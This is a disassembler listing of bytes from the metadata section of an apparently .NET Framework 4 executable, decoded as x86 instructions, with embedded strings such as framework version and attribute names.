  40ca28:	00 00                	add    %al,(%eax)
  40ca2a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca2d:	00 00                	add    %al,(%eax)
  40ca2f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca32:	00 00                	add    %al,(%eax)
  40ca34:	00 06                	add    %al,(%esi)
  40ca36:	00 02                	add    %al,(%edx)
  40ca38:	0e                   	push   %cs
  40ca39:	12 61 08             	adc    0x8(%ecx),%ah
  40ca3c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca41:	61                   	popa
  40ca42:	06                   	push   %es
  40ca43:	00 02                	add    %al,(%edx)
  40ca45:	0e                   	push   %cs
  40ca46:	05 12 61 05 00       	add    $0x56112,%eax
  40ca4b:	01 01                	add    %eax,(%ecx)
  40ca4d:	12 61 06             	adc    0x6(%ecx),%ah
  40ca50:	00 02                	add    %al,(%edx)
  40ca52:	01 12                	add    %edx,(%edx)
  40ca54:	61                   	popa
  40ca55:	0e                   	push   %cs
  40ca56:	07                   	pop    %es
  40ca57:	00 02                	add    %al,(%edx)
  40ca59:	01 12                	add    %edx,(%edx)
  40ca5b:	61                   	popa
  40ca5c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca61:	01 12                	add    %edx,(%edx)
  40ca63:	61                   	popa
  40ca64:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca69:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca6c:	06                   	push   %es
  40ca6d:	00 02                	add    %al,(%edx)
  40ca6f:	01 12                	add    %edx,(%edx)
  40ca71:	61                   	popa
  40ca72:	02 06                	add    (%esi),%al
  40ca74:	00 02                	add    %al,(%edx)
  40ca76:	01 12                	add    %edx,(%edx)
  40ca78:	61                   	popa
  40ca79:	0b 06                	or     (%esi),%eax
  40ca7b:	00 02                	add    %al,(%edx)
  40ca7d:	01 12                	add    %edx,(%edx)
  40ca7f:	61                   	popa
  40ca80:	0a 03                	or     (%ebx),%al
  40ca82:	06                   	push   %es
  40ca83:	11 78 04             	adc    %edi,0x4(%eax)
  40ca86:	20 01                	and    %al,(%ecx)
  40ca88:	01 08                	add    %ecx,(%eax)
  40ca8a:	08 01                	or     %al,(%ecx)
  40ca8c:	00 08                	add    %cl,(%eax)
  40ca8e:	00 00                	add    %al,(%eax)
  40ca90:	00 00                	add    %al,(%eax)
  40ca92:	00 1e                	add    %bl,(%esi)
  40ca94:	01 00                	add    %eax,(%eax)
  40ca96:	01 00                	add    %eax,(%eax)
  40ca98:	54                   	push   %esp
  40ca99:	02 16                	add    (%esi),%dl
  40ca9b:	57                   	push   %edi
  40ca9c:	72 61                	jb     0x40caff
  40ca9e:	70 4e                	jo     0x40caee
  40caa0:	6f                   	outsl  %ds:(%esi),(%dx)
  40caa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40caa2:	45                   	inc    %ebp
  40caa3:	78 63                	js     0x40cb08
  40caa5:	65 70 74             	gs jo  0x40cb1c
  40caa8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40caaf:	77 73                	ja     0x40cb24
  40cab1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cab7:	71 08                	jno    0x40cac1
  40cab9:	01 00                	add    %eax,(%eax)
  40cabb:	02 00                	add    (%eax),%al
  40cabd:	00 00                	add    %al,(%eax)
  40cabf:	00 00                	add    %al,(%eax)
  40cac1:	05 01 00 00 00       	add    $0x1,%eax
  40cac6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cac9:	00 07                	add    %al,(%edi)
  40cacb:	31 2e                	xor    %ebp,(%esi)
  40cacd:	30 2e                	xor    %ch,(%esi)
  40cacf:	30 2e                	xor    %ch,(%esi)
  40cad1:	30 00                	xor    %al,(%eax)
  40cad3:	00 65 01             	add    %ah,0x1(%ebp)
  40cad6:	00 29                	add    %ch,(%ecx)
  40cad8:	2e 4e                	cs dec %esi
  40cada:	45                   	inc    %ebp
  40cadb:	54                   	push   %esp
  40cadc:	46                   	inc    %esi
  40cadd:	72 61                	jb     0x40cb40
  40cadf:	6d                   	insl   (%dx),%es:(%edi)
  40cae0:	65 77 6f             	gs ja  0x40cb52
  40cae3:	72 6b                	jb     0x40cb50
  40cae5:	2c 56                	sub    $0x56,%al
  40cae7:	65 72 73             	gs jb  0x40cb5d
  40caea:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40caf1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40caf4:	72 6f                	jb     0x40cb65
  40caf6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cafd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb04:	0e                   	push   %cs
  40cb05:	14 46                	adc    $0x46,%al
  40cb07:	72 61                	jb     0x40cb6a
  40cb09:	6d                   	insl   (%dx),%es:(%edi)
  40cb0a:	65 77 6f             	gs ja  0x40cb7c
  40cb0d:	72 6b                	jb     0x40cb7a
  40cb0f:	44                   	inc    %esp
  40cb10:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb17:	61                   	popa
  40cb18:	6d                   	insl   (%dx),%es:(%edi)
  40cb19:	65 1f                	gs pop %ds
  40cb1b:	2e 4e                	cs dec %esi
  40cb1d:	45                   	inc    %ebp
  40cb1e:	54                   	push   %esp
  40cb1f:	20 46 72             	and    %al,0x72(%esi)
  40cb22:	61                   	popa
  40cb23:	6d                   	insl   (%dx),%es:(%edi)
  40cb24:	65 77 6f             	gs ja  0x40cb96
  40cb27:	72 6b                	jb     0x40cb94
  40cb29:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb2c:	43                   	inc    %ebx
  40cb2d:	6c                   	insb   (%dx),%es:(%edi)
  40cb2e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb35:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb36:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb3d:	04 49                	add    $0x49,%al
  40cb3f:	74 65                	je     0x40cba6
  40cb41:	6d                   	insl   (%dx),%es:(%edi)
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	03 07                	add    (%edi),%eax
  40cb46:	01 08                	add    %ecx,(%eax)
  40cb48:	04 00                	add    $0x0,%al
  40cb4a:	01 08                	add    %ecx,(%eax)
  40cb4c:	0e                   	push   %cs
  40cb4d:	03 07                	add    (%edi),%eax
  40cb4f:	01 02                	add    %eax,(%edx)
  40cb51:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb56:	b1 05                	mov    $0x5,%cl
  40cb58:	20 01                	and    %al,(%ecx)
  40cb5a:	0e                   	push   %cs
  40cb5b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb60:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb66:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb6c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb71:	03 02                	add    (%edx),%eax
  40cb73:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb78:	14 07                	adc    $0x7,%al
  40cb7a:	08 0e                	or     %cl,(%esi)
  40cb7c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb82:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb88:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb8e:	20 03                	and    %al,(%ebx)
  40cb90:	01 11                	add    %edx,(%ecx)
  40cb92:	80 d5 11             	adc    $0x11,%ch
  40cb95:	80 d9 11             	sbb    $0x11,%cl
  40cb98:	80 dd 05             	sbb    $0x5,%ch
  40cb9b:	00 02                	add    %al,(%edx)
  40cb9d:	02 0e                	add    (%esi),%cl
  40cb9f:	0e                   	push   %cs
  40cba0:	06                   	push   %es
  40cba1:	20 01                	and    %al,(%ecx)
  40cba3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cba8:	20 01                	and    %al,(%ecx)
  40cbaa:	08 08                	or     %cl,(%eax)
  40cbac:	07                   	pop    %es
  40cbad:	00 01                	add    %al,(%ecx)
  40cbaf:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbb4:	07                   	pop    %es
  40cbb5:	20 02                	and    %al,(%edx)
  40cbb7:	01 12                	add    %edx,(%edx)
  40cbb9:	80 c9 08             	or     $0x8,%cl
  40cbbc:	06                   	push   %es
  40cbbd:	20 01                	and    %al,(%ecx)
  40cbbf:	01 12                	add    %edx,(%edx)
  40cbc1:	80 f1 09             	xor    $0x9,%cl
  40cbc4:	20 02                	and    %al,(%edx)
  40cbc6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbcb:	80 f5 05             	xor    $0x5,%ch
  40cbce:	20 02                	and    %al,(%edx)
  40cbd0:	08 08                	or     %cl,(%eax)
  40cbd2:	08 06                	or     %al,(%esi)
  40cbd4:	20 02                	and    %al,(%edx)
  40cbd6:	01 12                	add    %edx,(%edx)
  40cbd8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbdd:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbe0:	09 20                	or     %esp,(%eax)
  40cbe2:	03 01                	add    (%ecx),%eax
  40cbe4:	12 61 02             	adc    0x2(%ecx),%ah
  40cbe7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbed:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbf3:	01 0e                	add    %ecx,(%esi)
  40cbf5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbfb:	02 09                	add    (%ecx),%cl
  40cbfd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc00:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc06:	0c 20                	or     $0x20,%al
  40cc08:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc0d:	08 08                	or     %cl,(%eax)
  40cc0f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc15:	01 11                	add    %edx,(%ecx)
  40cc17:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc1d:	02 12                	add    (%edx),%dl
  40cc1f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc22:	02 08                	add    (%eax),%cl
  40cc24:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc2a:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc2f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc34:	03 08                	add    (%eax),%ecx
  40cc36:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc3b:	20 01                	and    %al,(%ecx)
  40cc3d:	01 12                	add    %edx,(%edx)
  40cc3f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc45:	1c 0c                	sbb    $0xc,%al
  40cc47:	07                   	pop    %es
  40cc48:	06                   	push   %es
  40cc49:	1c 02                	sbb    $0x2,%al
  40cc4b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc50:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc56:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc59:	02 07                	add    (%edi),%al
  40cc5b:	20 02                	and    %al,(%edx)
  40cc5d:	02 08                	add    (%eax),%cl
  40cc5f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc65:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc6b:	07                   	pop    %es
  40cc6c:	0a 12                	or     (%edx),%dl
  40cc6e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc75:	08 12 81 
  40cc78:	41                   	inc    %ecx
  40cc79:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc7f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc84:	4d                   	dec    %ebp
  40cc85:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc8a:	0e                   	push   %cs
  40cc8b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc90:	41                   	inc    %ecx
  40cc91:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc96:	55                   	push   %ebp
  40cc97:	06                   	push   %es
  40cc98:	00 00                	add    %al,(%eax)
  40cc9a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc9f:	00 01                	add    %al,(%ecx)
  40cca1:	0e                   	push   %cs
  40cca2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cca7:	01 11                	add    %edx,(%ecx)
  40cca9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccb0:	41                   	inc    %ecx
  40ccb1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccb7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccbe:	49                   	dec    %ecx
  40ccbf:	0e                   	push   %cs
  40ccc0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccc6:	0e                   	push   %cs
  40ccc7:	0e                   	push   %cs
  40ccc8:	0e                   	push   %cs
  40ccc9:	0e                   	push   %cs
  40ccca:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cccf:	1c 07                	sbb    $0x7,%al
  40ccd1:	20 02                	and    %al,(%edx)
  40ccd3:	01 0e                	add    %ecx,(%esi)
  40ccd5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccdb:	0a 02                	or     (%edx),%al
  40ccdd:	10 07                	adc    %al,(%edi)
  40ccdf:	06                   	push   %es
  40cce0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cce6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccec:	0e                   	push   %cs
  40cced:	02 05 20 00 12 81    	add    0x81120020,%al
  40ccf3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40ccf9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40ccff:	91                   	xchg   %eax,%ecx
  40cd00:	04 20                	add    $0x20,%al
  40cd02:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd05:	04 07                	add    $0x7,%al
  40cd07:	02 02                	add    (%edx),%al
  40cd09:	02 03                	add    (%ebx),%al
  40cd0b:	20 00                	and    %al,(%eax)
  40cd0d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd10:	02 18                	add    (%eax),%bl
  40cd12:	02 03                	add    (%ebx),%al
  40cd14:	07                   	pop    %es
  40cd15:	01 0e                	add    %ecx,(%esi)
  40cd17:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd1c:	9d                   	popf
  40cd1d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd22:	1c 0a                	sbb    $0xa,%al
  40cd24:	07                   	pop    %es
  40cd25:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd2a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd2f:	20 01                	and    %al,(%ecx)
  40cd31:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd37:	0e                   	push   %cs
  40cd38:	08 08                	or     %cl,(%eax)
  40cd3a:	06                   	push   %es
  40cd3b:	07                   	pop    %es
  40cd3c:	02 02                	add    (%edx),%al
  40cd3e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd44:	0e                   	push   %cs
  40cd45:	0e                   	push   %cs
  40cd46:	0e                   	push   %cs
  40cd47:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd4c:	ad                   	lods   %ds:(%esi),%eax
  40cd4d:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd52:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd57:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd5d:	02 11                	add    (%ecx),%dl
  40cd5f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd65:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd6c:	12 81 8d 
  40cd6f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd75:	12 41 01             	adc    0x1(%ecx),%al
  40cd78:	0e                   	push   %cs
  40cd79:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd7e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd84:	00 06                	add    %al,(%esi)
  40cd86:	00 02                	add    %al,(%edx)
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd8f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd94:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd9a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cda0:	c5 09                	lds    (%ecx),%ecx
  40cda2:	00 02                	add    %al,(%edx)
  40cda4:	02 11                	add    (%ecx),%dl
  40cda6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdac:	07                   	pop    %es
  40cdad:	02 12                	add    (%edx),%dl
  40cdaf:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdb4:	01 02                	add    %eax,(%edx)
  40cdb6:	0e                   	push   %cs
  40cdb7:	10 02                	adc    %al,(%edx)
  40cdb9:	06                   	push   %es
  40cdba:	00 01                	add    %al,(%ecx)
  40cdbc:	01 12                	add    %edx,(%edx)
  40cdbe:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdc4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cdcb:	0e                   	push   %cs
  40cdcc:	1c 11                	sbb    $0x11,%al
  40cdce:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdd4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cddb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cde1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cde6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cded:	12 60 0e             	adc    0xe(%eax),%ah
  40cdf0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdf5:	12 60 12             	adc    0x12(%eax),%ah
  40cdf8:	60                   	pusha
  40cdf9:	06                   	push   %es
  40cdfa:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cdff:	60                   	pusha
  40ce00:	10 10                	adc    %dl,(%eax)
  40ce02:	01 01                	add    %eax,(%ecx)
  40ce04:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce09:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce0f:	1e                   	push   %ds
  40ce10:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce13:	01 12                	add    %edx,(%edx)
  40ce15:	60                   	pusha
  40ce16:	09 20                	or     %esp,(%eax)
  40ce18:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce1e:	13 00                	adc    (%eax),%eax
  40ce20:	07                   	pop    %es
  40ce21:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce26:	12 60 04             	adc    0x4(%eax),%ah
  40ce29:	20 00                	and    %al,(%eax)
  40ce2b:	13 00                	adc    (%eax),%eax
  40ce2d:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce32:	00 03                	add    %al,(%ebx)
  40ce34:	07                   	pop    %es
  40ce35:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce3c:	e5 07                	in     $0x7,%eax
  40ce3e:	20 01                	and    %al,(%ecx)
  40ce40:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce46:	20 01                	and    %al,(%ecx)
  40ce48:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce4e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce51:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce57:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce5d:	00 02                	add    %al,(%edx)
  40ce5f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce65:	0e                   	push   %cs
  40ce66:	1c 00                	sbb    $0x0,%al
  40ce68:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce6d:	82 09 0e             	orb    $0xe,(%ecx)
  40ce70:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce75:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce7b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce80:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce86:	45                   	inc    %ebp
  40ce87:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce8d:	4d                   	dec    %ebp
  40ce8e:	1c 12                	sbb    $0x12,%al
  40ce90:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce95:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce9a:	0e                   	push   %cs
  40ce9b:	0b 00                	or     (%eax),%eax
  40ce9d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cea3:	00 12                	add    %dl,(%edx)
  40cea5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ceac:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ceb1:	4d                   	dec    %ebp
  40ceb2:	1c 12                	sbb    $0x12,%al
  40ceb4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ceb9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cebe:	0e                   	push   %cs
  40cebf:	17                   	pop    %ss
  40cec0:	20 0a                	and    %cl,(%edx)
  40cec2:	01 13                	add    %edx,(%ebx)
  40cec4:	00 13                	add    %dl,(%ebx)
  40cec6:	01 13                	add    %edx,(%ebx)
  40cec8:	02 13                	add    (%ebx),%dl
  40ceca:	03 13                	add    (%ebx),%edx
  40cecc:	04 13                	add    $0x13,%al
  40cece:	05 13 06 13 07       	add    $0x7130613,%eax
  40ced3:	13 08                	adc    (%eax),%ecx
  40ced5:	13 09                	adc    (%ecx),%ecx
  40ced7:	05 07 01 12 82       	add    $0x82120107,%eax
  40cedc:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cee1:	0e                   	push   %cs
  40cee2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cee7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ceed:	06                   	push   %es
  40ceee:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cef4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cefa:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ceff:	20 01                	and    %al,(%ecx)
  40cf01:	01 11                	add    %edx,(%ecx)
  40cf03:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf0a:	82 31 05             	xorb   $0x5,(%ecx)
  40cf0d:	20 00                	and    %al,(%eax)
  40cf0f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf15:	01 12                	add    %edx,(%edx)
  40cf17:	61                   	popa
  40cf18:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf1e:	08 20                	or     %ah,(%eax)
  40cf20:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf26:	08 1a                	or     %bl,(%edx)
  40cf28:	07                   	pop    %es
  40cf29:	0a 12                	or     (%edx),%dl
  40cf2b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf32:	21 1d 05 
  40cf35:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf3a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf41:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf46:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf4c:	45                   	inc    %ebp
  40cf4d:	08 08                	or     %cl,(%eax)
  40cf4f:	04 07                	add    $0x7,%al
  40cf51:	02 02                	add    (%edx),%al
  40cf53:	08 09                	or     %cl,(%ecx)
  40cf55:	00 02                	add    %al,(%edx)
  40cf57:	01 12                	add    %edx,(%edx)
  40cf59:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf5d:	4d                   	dec    %ebp
  40cf5e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf63:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf69:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf6e:	02 12                	add    (%edx),%dl
  40cf70:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf74:	08 07                	or     %al,(%edi)
  40cf76:	04 12                	add    $0x12,%al
  40cf78:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf7d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf82:	1c 06                	sbb    $0x6,%al
  40cf84:	07                   	pop    %es
  40cf85:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf8b:	20 01                	and    %al,(%ecx)
  40cf8d:	13 00                	adc    (%eax),%eax
  40cf8f:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf92:	01 12                	add    %edx,(%edx)
  40cf94:	60                   	pusha
  40cf95:	0e                   	push   %cs
  40cf96:	07                   	pop    %es
  40cf97:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf9c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfa2:	12 60 07             	adc    0x7(%eax),%ah
  40cfa5:	07                   	pop    %es
  40cfa6:	04 08                	add    $0x8,%al
  40cfa8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfad:	20 01                	and    %al,(%ecx)
  40cfaf:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfb5:	64 04 00             	fs add $0x0,%al
  40cfb8:	01 0b                	add    %ecx,(%ebx)
  40cfba:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfbd:	01 0b                	add    %ecx,(%ebx)
  40cfbf:	0e                   	push   %cs
  40cfc0:	04 00                	add    $0x0,%al
  40cfc2:	01 0b                	add    %ecx,(%ebx)
  40cfc4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfc9:	0c 06                	or     $0x6,%al
  40cfcb:	00 01                	add    %al,(%ecx)
  40cfcd:	0b 11                	or     (%ecx),%edx
  40cfcf:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfd6:	04 00 01 
  40cfd9:	0a 0e                	or     (%esi),%cl
  40cfdb:	04 00                	add    $0x0,%al
  40cfdd:	01 0a                	add    %ecx,(%edx)
  40cfdf:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cfe4:	0c 06                	or     $0x6,%al
  40cfe6:	00 01                	add    %al,(%ecx)
  40cfe8:	0a 11                	or     (%ecx),%dl
  40cfea:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cff1:	04 00 01 
  40cff4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cff9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cffd:	ad                   	lods   %ds:(%esi),%eax
  40cffe:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d003:	0c 07                	or     $0x7,%al
  40d005:	07                   	pop    %es
  40d006:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d00c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d011:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d017:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d01d:	12 60 1d             	adc    0x1d(%eax),%ah
  40d020:	0e                   	push   %cs
  40d021:	0e                   	push   %cs
  40d022:	08 12                	or     %dl,(%edx)
  40d024:	60                   	pusha
  40d025:	08 05 07 01 12 81    	or     %al,0x81120107
  40d02b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d030:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d037:	05 08 08 06 00       	add    $0x60808,%eax
  40d03c:	02 07                	add    (%edi),%al
  40d03e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d043:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d04a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d050:	00 02                	add    %al,(%edx)
  40d052:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d058:	02 0b                	add    (%ebx),%cl
  40d05a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d05f:	02 06                	add    (%esi),%al
  40d061:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d066:	02 0a                	add    (%edx),%cl
  40d068:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d06d:	03 12                	add    (%edx),%edx
  40d06f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d076:	07 02 12 
  40d079:	60                   	pusha
  40d07a:	02 04 07             	add    (%edi,%eax,1),%al
  40d07d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d083:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d088:	04 1d                	add    $0x1d,%al
  40d08a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d08f:	06                   	push   %es
  40d090:	07                   	pop    %es
  40d091:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d097:	00 01                	add    %al,(%ecx)
  40d099:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d09e:	06                   	push   %es
  40d09f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
